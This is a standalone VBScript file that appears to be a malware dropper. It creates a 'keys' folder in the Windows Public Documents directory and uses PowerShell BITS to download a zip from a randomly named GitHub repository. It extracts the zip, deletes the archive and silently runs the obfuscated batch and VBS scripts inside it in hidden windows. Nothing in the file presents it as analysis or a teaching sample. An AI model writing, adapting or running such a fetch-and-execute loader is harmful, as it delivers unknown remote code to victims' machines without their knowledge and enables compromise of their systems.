Option Explicit

Dim fso, shell, publicDocs, baseDir, zipPath, outDir, url
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' =============================
' GET PUBLIC DOCUMENTS
' =============================
publicDocs = shell.ExpandEnvironmentStrings("%PUBLIC%") & "\Documents"

' =============================
' CREATE \keys DIRECTORY
' =============================
baseDir = publicDocs & "\keys"

If Not fso.FolderExists(baseDir) Then
    fso.CreateFolder(baseDir)
End If

' =============================
' ZIP FILE LOCATION
' =============================
zipPath = baseDir & "\assets.zip"

' =============================
' EXTRACT DESTINATION
' =============================
outDir = baseDir

' =============================
' GITHUB ZIP URL
' =============================
url = "https://github.com/Gelli08/spwww743g7w/archive/refs/heads/main.zip"

' =============================
' DOWNLOAD ZIP USING BITS
' =============================
Dim bitsCmd
bitsCmd = "powershell -NoLogo -NoProfile -Command ""Start-BitsTransfer -Source '" & url & "' -Destination '" & zipPath & "' -ErrorAction Stop"""
shell.Run bitsCmd, 0, True

' =============================
' EXTRACT ZIP
' =============================
shell.Run "powershell -NoLogo -NoProfile -Command ""Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & outDir & "' -Force""", 0, True

' DELETE ZIP
If fso.FileExists(zipPath) Then fso.DeleteFile zipPath, True

' =============================
' FIND GITHUB AUTO-FOLDER
' =============================
Dim folder, gitFolder
gitFolder = ""

For Each folder In fso.GetFolder(outDir).SubFolders
    If InStr(folder.Name, "-main") > 0 Or InStr(folder.Name, "-master") > 0 Then
        gitFolder = folder.Path
        Exit For
    End If
Next

' =============================
' MOVE FILES FROM GITHUB FOLDER INTO keys\
' =============================
If gitFolder <> "" Then

    Dim f, subf

    ' --- move files ---
    For Each f In fso.GetFolder(gitFolder).Files
        f.Move baseDir & "\" & f.Name
    Next

    ' --- move folders (if any) ---
    For Each subf In fso.GetFolder(gitFolder).SubFolders
        subf.Move baseDir & "\" & subf.Name
    Next

    ' --- delete empty leftover folder ---
    If fso.FolderExists(gitFolder) Then fso.DeleteFolder gitFolder, True
End If

' =============================
' RUN STEP 1
' =============================
shell.Run """" & baseDir & "\wg43w78tw4grun.bat" & """", 0, False

Do
    WScript.Sleep 500
Loop While ProcessRunning("wg43w78tw4grun.bat")

' =============================
' RUN STEP 2
' =============================
shell.Run """" & baseDir & "\vw2i45ibzfrun2.bat" & """", 0, False

Do
    WScript.Sleep 500
Loop While ProcessRunning("vw2i45ibzfrun2.bat")

shell.Run """" & baseDir & "\run2.vbs" & """", 0, False


' =============================
' CHECK IF PROCESS IS RUNNING
' =============================
Function ProcessRunning(procName)
    Dim svc, procs
    Set svc   = GetObject("winmgmts:root\cimv2")
    Set procs = svc.ExecQuery("SELECT * FROM Win32_Process WHERE Name='" & procName & "'")
    ProcessRunning = (procs.Count > 0)
End Function
